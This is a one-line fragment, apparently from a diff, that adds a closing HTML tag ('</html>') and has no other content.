+</html>
